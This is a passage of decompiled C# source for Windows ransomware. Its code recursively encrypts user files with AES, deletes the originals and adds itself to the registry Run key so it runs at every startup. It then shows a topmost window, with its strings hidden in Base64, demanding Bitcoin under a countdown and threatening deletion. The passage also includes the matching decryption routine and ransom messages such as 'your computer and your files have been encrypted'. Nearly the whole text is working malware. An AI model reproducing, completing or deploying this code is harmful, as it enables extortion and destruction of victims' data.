		lxuybk.set_TextAlign((HorizontalAlignment)2);
		((Control)lxuybk).set_Visible(false);
		((Control)kjdwytm).set_AutoSize(true);
		((Control)kjdwytm).set_BackColor(Color.FromArgb(26, 135, 197));
		((Control)kjdwytm).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 17f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)kjdwytm).set_ForeColor(Color.FromArgb(255, 255, 255));
		((Control)kjdwytm).set_Location(new Point(116, 202));
		((Control)kjdwytm).set_Name(klfhxfx("eHh4MTl4eHg="));
		((Control)kjdwytm).set_Size(new Size(665, 20));
		((Control)kjdwytm).set_TabIndex(8);
		((Control)kjdwytm).set_Text(klfhxfx("WW91IG11c3Qgc2VuZCBhdCBsZWFzdCA=") + "1.0" + klfhxfx("IEJpdGNvaW4gdG8gb3VyIHdhbGxldCBhbmQgeW91IHdpbGwgZ2V0IHlvdXIgZmlsZXMgYmFjaw=="));
		kjdwytm.set_TextAlign((ContentAlignment)32);
		((Control)kjdwytm).set_Visible(false);
		((Control)ehsvktktri).set_AutoSize(true);
		((Control)ehsvktktri).set_BackColor(Color.FromArgb(26, 135, 197));
		((Control)ehsvktktri).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 17f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)ehsvktktri).set_ForeColor(Color.FromArgb(255, 255, 255));
		((Control)ehsvktktri).set_Location(new Point(136, 235));
		((Control)ehsvktktri).set_Name(klfhxfx("eHh4MjB4eHg="));
		((Control)ehsvktktri).set_Size(new Size(193, 20));
		((Control)ehsvktktri).set_TabIndex(6);
		((Control)ehsvktktri).set_Text(klfhxfx("WW91ciBwZXJzb25hbCB1bmlxdWUgSUQ6"));
		ehsvktktri.set_TextAlign((ContentAlignment)32);
		((Control)ehsvktktri).set_Visible(false);
		((Control)eqbuxanldh).set_AutoSize(true);
		((Control)eqbuxanldh).set_BackColor(Color.FromArgb(26, 135, 197));
		((Control)eqbuxanldh).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 17f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)eqbuxanldh).set_ForeColor(Color.FromArgb(255, 255, 255));
		((Control)eqbuxanldh).set_Location(new Point(56, 78));
		((Control)eqbuxanldh).set_Name(klfhxfx("eHh4OXh4eA=="));
		((Control)eqbuxanldh).set_Size(new Size(688, 20));
		((Control)eqbuxanldh).set_TabIndex(4);
		((Control)eqbuxanldh).set_Text(klfhxfx("YnV0IHdhaXQsIGRvblwndCB3b3JyeS4gVGhlcmUgaXMgYSB3YXkgdGhhdCB5b3UgY2FuIHJlc3RvcmUgeW91ciBjb21wdXRlciBhbmQgYWxsIG9mIHlvdXIgZmlsZXM="));
		eqbuxanldh.set_TextAlign((ContentAlignment)32);
		((Control)eqbuxanldh).set_Visible(false);
		((Control)xsloixjg).set_AutoSize(true);
		((Control)xsloixjg).set_BackColor(Color.FromArgb(26, 135, 197));
		((Control)xsloixjg).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 17f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)xsloixjg).set_ForeColor(Color.FromArgb(255, 255, 255));
		((Control)xsloixjg).set_Location(new Point(116, 54));
		((Control)xsloixjg).set_Name(klfhxfx("eHh4MTB4eHg="));
		((Control)xsloixjg).set_Size(new Size(569, 20));
		((Control)xsloixjg).set_TabIndex(3);
		((Control)xsloixjg).set_Text(klfhxfx("V2UgYXJlIHNvcnJ5IHRvIHNheSB0aGF0IHlvdXIgY29tcHV0ZXIgYW5kIHlvdXIgZmlsZXMgaGF2ZSBiZWVuIGVuY3J5cHRlZCw="));
		xsloixjg.set_TextAlign((ContentAlignment)32);
		((Control)xsloixjg).set_Visible(false);
		((Control)xtmkybyej).set_AutoSize(true);
		((Control)xtmkybyej).set_BackColor(Color.FromArgb(26, 135, 197));
		((Control)xtmkybyej).set_Font(new Font(klfhxfx("TWljcm9zb2Z0IFNhbnMgU2VyaWY="), 30f, (FontStyle)0, (GraphicsUnit)2, (byte)177));
		((Control)xtmkybyej).set_ForeColor(Color.FromArgb(255, 255, 255));
		((Control)xtmkybyej).set_Location(new Point(264, 11));
		((Control)xtmkybyej).set_Name(klfhxfx("eHh4MTF4eHg="));
		((Control)xtmkybyej).set_Size(new Size(272, 36));
		((Control)xtmkybyej).set_TabIndex(2);
		((Control)xtmkybyej).set_Text(klfhxfx("V2FybmluZyBNZXNzYWdlISE="));
		((Control)xtmkybyej).set_Visible(false);
		deyqyrcm.DoWork += cvqqar;
		deyqyrcm.RunWorkerCompleted += jimfy;
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(26, 135, 197));
		((Form)this).set_ClientSize(new Size(799, 619));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)nmrnfongih);
		((Control)this).get_Controls().Add((Control)(object)cphztnc);
		((Control)this).get_Controls().Add((Control)(object)owfseikso);
		((Control)this).get_Controls().Add((Control)(object)gdarr);
		((Control)this).get_Controls().Add((Control)(object)oktyw);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_MaximumSize(new Size(815, 635));
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_MinimumSize(new Size(815, 635));
		((Control)this).set_Name(klfhxfx("eHh4Mjd4eHg="));
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Form)this).add_Load((EventHandler)ovzpbbzv);
		((ISupportInitialize)oktyw).EndInit();
		((Control)nmrnfongih).ResumeLayout(false);
		((Control)nmrnfongih).PerformLayout();
		((ISupportInitialize)pklnsqh).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void ovzpbbzv(object sender, EventArgs e)
	{
		if (!File.Exists(dasgss) && Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Assembly.GetEntryAssembly()!.Location)).Length <= 1)
		{
			ynjofxz();
			lyuszgrzik(cjtvt[0] + klfhxfx("XFx0ZXN0LnR4dA=="), "");
		}
		else
		{
			Application.Exit();
		}
	}

	private void ynjofxz()
	{
		zsxabttsw.set_Interval(500);
		zsxabttsw.add_Tick((EventHandler)amsdvwwmxb);
		zsxabttsw.Start();
		if (File.Exists(leyeg))
		{
			fuluqqmvy.set_Interval(1);
		}
		else
		{
			fuluqqmvy.set_Interval(ptxemuvt);
		}
		fuluqqmvy.add_Tick((EventHandler)giefjr);
		fuluqqmvy.Start();
		pxcrpvbuxu();
	}

	public void amsdvwwmxb(object sender, EventArgs e)
	{
		iyokq += gggqstji.Next(0, 100);
		if (iyokq <= 200)
		{
			((Control)cphztnc).set_Text("");
		}
		else
		{
			((Control)cphztnc).set_Text(string.Format(klfhxfx("ezB9IEtCIA=="), iyokq));
		}
		if (iyokq > 2400)
		{
			((Control)this).Hide();
		}
	}

	public void giefjr(object sender, EventArgs e)
	{
		fuluqqmvy.Stop();
		pocsbyqznz.DoWork += grcnzgsixq;
		pocsbyqznz.WorkerReportsProgress = true;
		pocsbyqznz.RunWorkerAsync();
	}

	private void grcnzgsixq(object sender, DoWorkEventArgs e)
	{
		if (!File.Exists(ghfszhoyz))
		{
			lyuszgrzik(ghfszhoyz, "");
		}
		string[] array = cjtvt;
		foreach (string myzfxue in array)
		{
			fyetgu(vkostov, dhhoygb, myzfxue, foqjotr);
		}
	}

	private void rkaair(object sender, RunWorkerCompletedEventArgs e)
	{
		if (File.Exists(ghfszhoyz))
		{
			try
			{
				((Control)this).Show();
				File.Delete(ghfszhoyz);
				((Form)this).set_Opacity(100.0);
			}
			catch (Exception)
			{
			}
		}
		((Form)this).set_TopMost(false);
		((Control)this).Show();
		if (!File.Exists(leyeg))
		{
			lyuszgrzik(leyeg, "");
		}
		pocsbyqznz.Dispose();
		((Control)gdarr).Hide();
		((Control)oktyw).Hide();
		((Control)owfseikso).Hide();
		zsxabttsw.Stop();
		((Control)cphztnc).Hide();
		((Control)nmrnfongih).Show();
		((Control)xtmkybyej).Show();
		((Control)xsloixjg).Show();
		((Control)eqbuxanldh).Show();
		((Control)kjdwytm).Show();
		((Control)ehsvktktri).Show();
		((Control)jyxeeejr).Show();
		((Control)iuggembcgo).Show();
		((Control)vyypirhr).Show();
		((Control)xgifxg).Show();
		((Control)eplizslo).Show();
		((Control)coxeju).Show();
		((Control)lxuybk).Show();
		((Control)lxuybk).set_Text(ymtppfwi);
		((Control)pykuvrda).Show();
		((Control)pykuvrda).set_Text(dwaakbgbjt);
		((Control)cxifugygdc).Show();
		((Control)coxeju).set_Text(obgrinfgth.Replace(klfhxfx("W0ZJTEVTX0xJU1Rd"), ajxzsh(wbakm)));
		iafidrenke = iafidrenke.Replace(klfhxfx("W0ZJTEVTX0xJU1Rd"), ajxzsh(wbakm));
		ahjpgv = reyixq();
		wnhnttlnrn.set_Interval(1000);
		wnhnttlnrn.set_Enabled(true);
		wnhnttlnrn.add_Tick((EventHandler)gkzynh);
		wnhnttlnrn.Start();
		gzwxevgb();
		Process.Start(cjtvt[0] + klfhxfx("XFw=") + cmhttgnb);
	}

	private void gkzynh(object sender, EventArgs e)
	{
		TimeSpan timeSpan = ahjpgv - DateTime.Now;
		((Control)cxifugygdc).set_Text(timeSpan.Days.ToString(klfhxfx("MDA=")) + klfhxfx("IERheXMg") + timeSpan.Hours.ToString(klfhxfx("MDA=")) + klfhxfx("Og==") + timeSpan.Minutes.ToString(klfhxfx("MDA=")) + klfhxfx("Og==") + timeSpan.Seconds.ToString(klfhxfx("MDA=")) + klfhxfx("IEhvdXJz"));
	}

	private static void fyetgu(string olzoyzrlc, string oteie, string myzfxue, Action<string[]> zchsi)
	{
		string[] files = Directory.GetFiles(myzfxue);
		foreach (string text in files)
		{
			zchsi(new string[3] { text, olzoyzrlc, oteie });
		}
		string[] directories = Directory.GetDirectories(myzfxue);
		foreach (string text2 in directories)
		{
			try
			{
				if ((File.GetAttributes(text2) & FileAttributes.Hidden) != FileAttributes.Hidden)
				{
					fyetgu(olzoyzrlc, oteie, text2, zchsi);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	public static void foqjotr(string[] burzib)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(wbakm, append: true);
			List<string> list = new List<string>();
			list.AddRange(bcyfadlv);
			long length = new FileInfo(burzib[0]).Length;
			string name = new FileInfo(burzib[0]).Name;
			if (list.Contains(Path.GetExtension(burzib[0])!.ToLower()) && length <= jhqxgirx && name != cmhttgnb && name != bhlklc)
			{
				gomblulrzg(burzib[0], burzib[1], burzib[2]);
				File.Delete(burzib[0]);
				streamWriter.WriteLine(burzib[0]);
			}
			streamWriter.Close();
		}
		catch (Exception)
		{
		}
	}

	public static byte[] mxeapattc(byte[] rnrvhimgn, byte[] piuqjxkcy)
	{
		try
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(piuqjxkcy, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(rnrvhimgn, 0, rnrvhimgn.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
		catch (Exception)
		{
			return null;
		}
	}

	public static void gomblulrzg(string dpgsj, string tdwasjjr, string jxpjwwyi)
	{
		try
		{
			byte[] rnrvhimgn = File.ReadAllBytes(dpgsj);
			byte[] bytes = Encoding.UTF8.GetBytes(tdwasjjr);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = mxeapattc(rnrvhimgn, bytes);
			string path = dpgsj + jxpjwwyi;
			File.WriteAllBytes(path, bytes2);
		}
		catch (Exception)
		{
		}
	}

	public static DateTime reyixq()
	{
		DateTime dateTime = DateTime.Now.AddDays(qnowpv);
		try
		{
			if (File.Exists(bvyssfbkc))
			{
				dateTime = Convert.ToDateTime(File.ReadAllText(bvyssfbkc));
				return dateTime;
			}
			StreamWriter streamWriter = new StreamWriter(bvyssfbkc);
			streamWriter.Write(dateTime);
			streamWriter.Close();
			return dateTime;
		}
		catch (Exception)
		{
			return dateTime;
		}
	}

	public void gzwxevgb()
	{
		try
		{
			string[] array = cjtvt;
			foreach (string text in array)
			{
				lyuszgrzik(text + klfhxfx("XFw=") + cmhttgnb, iafidrenke);
				lyuszgrzik(text + klfhxfx("XFw=") + bhlklc, obgrinfgth);
			}
		}
		catch (Exception)
		{
		}
	}

	public void vyegoa()
	{
		try
		{
			string[] array = cjtvt;
			foreach (string text in array)
			{
				if (File.Exists(text + klfhxfx("XFw=") + cmhttgnb))
				{
					File.Delete(text + klfhxfx("XFw=") + cmhttgnb);
				}
				if (File.Exists(text + klfhxfx("XFw=") + bhlklc))
				{
					File.Delete(text + klfhxfx("XFw=") + bhlklc);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public bool lyuszgrzik(string lvwhuaoj, string gufmh)
	{
		try
		{
			StreamWriter streamWriter = new StreamWriter(lvwhuaoj);
			streamWriter.Write(gufmh);
			streamWriter.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public string ajxzsh(string ddjlykzh)
	{
		try
		{
			StreamReader streamReader = new StreamReader(ddjlykzh);
			string result = streamReader.ReadToEnd();
			streamReader.Close();
			return result;
		}
		catch (Exception)
		{
			return "";
		}
	}

	private static void pxcrpvbuxu()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(klfhxfx("U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1bg=="), writable: true);
			registryKey.SetValue(hxlqy, Application.get_ExecutablePath());
		}
		catch (Exception)
		{
		}
	}

	private static void jqumyaejkf()
	{
		try
		{
			Registry.CurrentUser.OpenSubKey(klfhxfx("U09GVFdBUkVcXE1pY3Jvc29mdFxcV2luZG93c1xcQ3VycmVudFZlcnNpb25cXFJ1bg=="), writable: true)?.DeleteValue(hxlqy);
		}
		catch (Exception)
		{
		}
	}

	public static string fzbzw(string axsvcurllm)
	{
		using MD5 mD = MD5.Create();
		byte[] bytes = Encoding.ASCII.GetBytes(axsvcurllm);
		byte[] array = mD.ComputeHash(bytes);
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString(klfhxfx("WDI=")));
		}
		return stringBuilder.ToString();
	}

	public static string quwekvotfj(string novxlaqh)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(novxlaqh);
		return Convert.ToBase64String(bytes);
	}

	public static string klfhxfx(string uswzdrnwxx)
	{
		byte[] bytes = Convert.FromBase64String(uswzdrnwxx);
		return Encoding.UTF8.GetString(bytes);
	}

	private void nczqu(object sender, EventArgs e)
	{
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Unknown result type (might be due to invalid IL or missing references)
		bool flag = false;
		if (((Control)eplizslo).get_Text() != "")
		{
			string[] files = Directory.GetFiles(cjtvt[0]);
			string[] array = files;
			foreach (string text in array)
			{
				if (!(Path.GetExtension(text)!.ToLower() == dhhoygb))
				{
					continue;
				}
				if (guqsk(text, ((Control)eplizslo).get_Text()))
				{
					File.Delete(text);
					flag = true;
					MessageBox.Show(klfhxfx("VEhBTksgWU9VXHJcblByZXNzIE9LIGFuZCB3ZSB3aWxsIHN0YXJ0IGZpeGluZyB5b3VyIGZpbGVzLg=="));
					break;
				}
				if (xggvf == 0)
				{
					MessageBox.Show(klfhxfx("REVMRVRJTkcgRklMRVMgU1RBUlRFRCEhXHJcbnlvdSBoYXZlIDIgaG91cnMgdG8gcGF5IG9yIGFsbCB5b3VyIGZpbGVzIHdpbGwgYmUgbG9zdCBmb3JldmVy"));
				}
				else
				{
					xggvf--;
				}
				if (xggvf > 1)
				{
					MessageBox.Show(klfhxfx("Q09ERSBJUyBXUk9ORyEhIVxyXG5wbGVhc2UgYnV5IHRoZSByaWdodCBjb2RlLCB5b3UndmUgbGVmdCA=") + xggvf + klfhxfx("IGF0dGVtcHRzIGJlZm9yZSB5b3VyIHN5c3RlbSB3aWxsIGJlIGJsb2NrZWQhISE="));
				}
				if (xggvf == 1)
				{
					MessageBox.Show(klfhxfx("TEFTVCBDSEFOQ0UhISB5b3UgbXVzdCBidXkgdGhlIHJpZ2h0IGNvZGUsIG90aGVyd2lzZSB5b3VyIHN5c3RlbSB3aWxsIGJlIGJsb2NrZWQhISE="));
				}
				((Control)eplizslo).set_Text("");
				break;
			}
		}
		else
		{
			MessageBox.Show(klfhxfx("UGxlYXNlIGJ1eSB0aGUgcmlnaHQgY29kZSBvdGhlcndpc2UgeW91ciBzeXN0ZW0gd2lsbCBiZSBibG9ja2VkISEh"));
		}
		if (flag)
		{
			((Control)oktyw).Show();
			wnhnttlnrn.Stop();
			((Control)gdarr).Show();
			((Control)gdarr).set_Text(klfhxfx("V2UgYXJlIGZpeGluZyB5b3VyIGZpbGVzIHBsZWFzZSB3YWl0Li4u"));
			((Control)gdarr).set_Location(new Point(200, 194));
			((Control)owfseikso).Show();
			((Control)owfseikso).set_Text(klfhxfx("RG8gbm90IHR1cm4gb2ZmIHlvdXIgY29tcHV0ZXIhIQ=="));
			((Control)owfseikso).set_Location(new Point(230, 374));
			((Control)nmrnfongih).Hide();
			((Control)xtmkybyej).Hide();
			((Control)xsloixjg).Hide();
			((Control)eqbuxanldh).Hide();
			((Control)kjdwytm).Hide();
			((Control)ehsvktktri).Hide();
			((Control)jyxeeejr).Hide();
			((Control)iuggembcgo).Hide();
			((Control)vyypirhr).Hide();
			((Control)xgifxg).Hide();
			((Control)eplizslo).Hide();
			((Control)coxeju).Hide();
			((Control)lxuybk).Hide();
			((Control)pykuvrda).Hide();
			((Control)cxifugygdc).Show();
			deyqyrcm.DoWork += cvqqar;
			deyqyrcm.WorkerReportsProgress = true;
			deyqyrcm.RunWorkerAsync();
		}
	}

	private void cvqqar(object sender, DoWorkEventArgs e)
	{
		string[] array = cjtvt;
		foreach (string hvcvy in array)
		{
			nfdsgqtyt(((Control)eplizslo).get_Text(), hvcvy);
		}
	}

	private void jimfy(object sender, RunWorkerCompletedEventArgs e)
	{
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		((Control)gdarr).Hide();
		((Control)owfseikso).Hide();
		((Control)oktyw).Hide();
		try
		{
			vyegoa();
			jqumyaejkf();
			File.Delete(wbakm);
			File.Delete(bvyssfbkc);
			File.Delete(avofijbbk);
			File.Delete(leyeg);
			lyuszgrzik(dasgss, "");
		}
		catch (Exception)
		{
		}
		MessageBox.Show(klfhxfx("V0UgQVJFIERPTkVcclxuWW91ciBmaWxlcyBhcmUgZ29vZCBub3chISBZb3UgY2FuIHNhZmVseSBkZWxldGUgdGhpcyBwcm9ncmFt"));
		Application.Exit();
	}

	private static void nfdsgqtyt(string ibhnavyvj, string hvcvy)
	{
		string[] files = Directory.GetFiles(hvcvy);
		foreach (string text in files)
		{
			if (Path.GetExtension(text)!.ToLower() == dhhoygb && guqsk(text, ibhnavyvj))
			{
				File.Delete(text);
			}
		}
		string[] directories = Directory.GetDirectories(hvcvy);
		foreach (string text2 in directories)
		{
			try
			{
				if ((File.GetAttributes(text2) & FileAttributes.Hidden) != FileAttributes.Hidden)
				{
					nfdsgqtyt(ibhnavyvj, text2);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	public static byte[] nhaodzjn(byte[] qiclhfulmp, byte[] holuvda)
	{
		byte[] result = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		try
		{
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(holuvda, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(qiclhfulmp, 0, qiclhfulmp.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static bool guqsk(string qtosdmjox, string hxroke)
	{
		try
		{
			byte[] qiclhfulmp = File.ReadAllBytes(qtosdmjox);
			byte[] bytes = Encoding.UTF8.GetBytes(hxroke);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = nhaodzjn(qiclhfulmp, bytes);
			string path = qtosdmjox.Replace(dhhoygb, "");
			File.WriteAllBytes(path, bytes2);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}
}
